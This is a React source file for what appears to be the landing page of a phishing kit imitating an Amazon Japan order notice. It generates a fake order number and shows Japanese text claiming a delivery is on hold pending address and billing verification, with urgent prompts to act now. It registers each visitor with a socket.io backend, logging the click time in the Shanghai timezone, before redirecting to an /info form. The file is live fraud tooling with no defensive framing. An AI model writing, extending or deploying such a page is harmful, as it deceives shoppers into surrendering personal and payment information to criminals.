import { useEffect, useMemo, useState } from 'react';
import { useNavigate } from 'react-router-dom';
import { socket } from '../socket';
import { getClientId, setActivated } from '../session';
import { BRAND, BRAND_PROMISES } from '../brand';

function buildOrderNumber(clientId: string) {
  const seed = (clientId || 'amazon-order-seed').replace(/[^a-zA-Z0-9]/g, '');
  let hash = 0;
  for (let i = 0; i < seed.length; i += 1) {
    hash = (hash * 33 + seed.charCodeAt(i)) >>> 0;
  }

  const segment = (length: number, salt: number) => {
    let value = (hash ^ salt) >>> 0;
    let out = '';
    while (out.length < length) {
      value = (value * 1664525 + 1013904223) >>> 0;
      out += String(value % 10);
    }
    return out.slice(0, length);
  };

  return `${segment(3, 0x9e37)}-${segment(7, 0x85eb)}-${segment(7, 0xc2b2)}`;
}

export default function Home() {
  const navigate = useNavigate();
  const [loading, setLoading] = useState(false);
  const orderNumber = useMemo(() => buildOrderNumber(getClientId()), []);
  const orderPlacedDate = new Intl.DateTimeFormat('ja-JP', {
    year: 'numeric',
    month: 'long',
    day: 'numeric',
  }).format(new Date());

  useEffect(() => {
    const clientId = getClientId();
    let started = false;

    const attachHomeSession = () => {
      if (started) return;
      started = true;
      socket.emit('attach-client', { clientId }, () => {
        socket.emit('join-page', 'home');
      });
    };

    if (!socket.connected) {
      socket.connect();
      socket.once('connect', attachHomeSession);
      window.setTimeout(attachHomeSession, 900);
    } else {
      attachHomeSession();
    }

    return () => {
      socket.off('connect', attachHomeSession);
    };
  }, []);

  const handleContinue = () => {
    if (loading) return;
    setLoading(true);

    try {
      const clientId = getClientId();
      setActivated(true);

      const registerTime = new Date().toLocaleString('ja-JP', {
        timeZone: 'Asia/Shanghai',
        hour12: false,
      });

      let started = false;
      const start = () => {
        if (started) return;
        started = true;

        socket.emit('attach-client', { clientId }, () => {
          socket.emit('join-page', 'home');
          socket.emit('register-user', { clickTime: registerTime, clientId }, () => {
            setLoading(false);
            navigate('/info');
          });
        });
      };

      if (!socket.connected) {
        socket.connect();
        socket.once('connect', start);
        // Best-effort fallback: don't block forever if connect event is missed.
        window.setTimeout(start, 900);
        return;
      }

      start();
    } catch {
      setLoading(false);
    }
  };

  return (
    <div className="alz-page">
      <div className="alz-shell">
        <div className="alz-home-grid alz-home-order-layout">
          <div className="alz-card alz-home-main-card">
            <div className="alz-home-kicker">ご注文内容</div>
            <div className="alz-order-header">
              <div>
                <h2 className="alz-page-title">配送先の確認が完了するまで配送は保留されています</h2>
                <p className="alz-page-copy">
                  この注文に登録されている配送先情報ではお届けを完了できませんでした。下記の配送情報をご確認のうえ、お手続きを続けてください。
                </p>
              </div>
              <div className="alz-order-id">
                <span>注文番号</span>
                <strong>{orderNumber}</strong>
              </div>
            </div>

            <div className="alz-home-mobile-strip">
              <span>注文番号 {orderNumber}</span>
              <strong>保留中</strong>
            </div>

            <div className="alz-order-product">
              <div className="alz-order-product-thumb" />
              <div className="alz-order-product-copy">
                <div className="alz-order-product-title">この注文は配送確認が必要です</div>
                <div className="alz-order-product-meta">配送先情報が確認されるまで、1点の商品をお届けできません。</div>
                <div className="alz-order-product-meta">注文日 {orderPlacedDate}</div>
              </div>
              <div className="alz-order-product-price">保留中</div>
            </div>

            <div className="alz-order-panel-grid">
              <section className="alz-order-panel">
                <div className="alz-order-panel-title">確認が必要な理由</div>
                <div className="alz-order-panel-copy">この注文に登録されている配送情報に不一致が見つかりました。内容を確認すると配送手続きが再開されます。</div>
                <div className="alz-order-panel-meta">
                  <span>現在この配送は保留中です</span>
                  <strong>確認後に配送が再開されます</strong>
                </div>
              </section>
            </div>

            <div className="alz-brand-row">
              {BRAND_PROMISES.map((item) => (
                <span key={item} className="alz-brand-pill">{item}</span>
              ))}
            </div>

            <div className="alz-order-action">
              <div className="alz-order-action-alert">追加の配送遅延を防ぐため、今すぐこの注文を確認してください。</div>
              <button onClick={handleContinue} disabled={loading} className="alz-btn-primary alz-btn-primary-home text-base">
                {loading ? '読み込み中...' : '配送先情報を確認する'}
              </button>
              <p className="alz-helper-copy">通常は2分以内で完了します。</p>
            </div>

            <div className="text-[11px] text-[#565959] mt-1">{BRAND.legal}</div>
          </div>

          <aside className="alz-card alz-home-aside-card alz-side-summary">
            <div className="alz-side-summary-title">配送状況</div>
            <div className="alz-order-mini-card">
              <div className="alz-order-mini-thumb" />
              <div>
                <div className="alz-order-mini-title">配送確認が必要です</div>
                <div className="alz-order-mini-copy">この注文の1点について、最新の配送情報が必要です。</div>
              </div>
            </div>
            <div className="alz-side-summary-list">
              <div>配送先住所の確認</div>
              <div>請求情報の確認</div>
              <div>確認後に出荷再開</div>
            </div>
            <div className="alz-side-summary-box">必要な情報の確認後、配送が再開されます。</div>
            <div className="alz-side-summary-help">お困りの場合は、カスタマーサービスをご利用ください。</div>
          </aside>
        </div>
      </div>
    </div>
  );
}
